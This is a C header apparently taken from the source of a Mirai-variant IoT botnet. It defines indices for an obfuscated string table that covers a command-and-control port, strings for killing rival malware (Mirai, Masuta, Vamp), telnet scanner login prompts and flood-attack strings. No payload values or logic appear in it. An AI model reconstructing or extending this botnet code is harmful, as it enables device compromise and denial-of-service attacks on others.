#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

// Connection Info
#define TABLE_CNC_PORT                  2
#define TABLE_SCAN_CB_PORT   			4
// Exec MSG
#define TABLE_EXEC_SUCCESS              5
// Killer Strings
#define TABLE_KILLER_PROC				6
#define TABLE_KILLER_EXE				7
#define TABLE_KILLER_FD					8
#define TABLE_KILLER_TCP				9
#define TABLE_KILLER_MAPS				10
#define TABLE_KILLER_STATUS				11
#define TABLE_KILLER_ANIME				12
#define TABLE_MEM_ROUTE					13
#define TABLE_MEM_CPUINFO				14
#define TABLE_MEM_BOGO					15
#define TABLE_MEM_RC					16
#define TABLE_MEM_MASUTA1				17
#define TABLE_MEM_MASUTA2				18
#define TABLE_MEM_MIRAI1				19
#define TABLE_MEM_MIRAI2				20
#define TABLE_MEM_VAMP1 				21
#define TABLE_MEM_VAMP2	   	   	    	22
#define TABLE_MEM_VAMP3	  	  	  	    23
//Scanner
#define TABLE_SCAN_SHELL				24
#define TABLE_SCAN_ENABLE				25
#define TABLE_SCAN_SYSTEM				26
#define TABLE_SCAN_SH					27
#define TABLE_SCAN_QUERY				28
#define TABLE_SCAN_RESP					29
#define TABLE_SCAN_NCORRECT				30
#define TABLE_SCAN_ASSWORD				31
#define TABLE_SCAN_OGIN					32
#define TABLE_SCAN_ENTER				33
#define TABLE_SCAN_PS					34
#define TABLE_SCAN_KILL_9				35
//Attack Strings
#define TABLE_ATK_VSE					36
#define TABLE_ATK_RESOLVER				37
#define TABLE_ATK_NSERV					38
//MISC SHIT
#define TABLE_MISC_WATCHDOG				39
#define TABLE_MISC_WATCHDOG2			40
#define TABLE_MISC_RAND					41
#define TABLE_MISC_DVRHELP				42


#define TABLE_MAX_KEYS  43 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
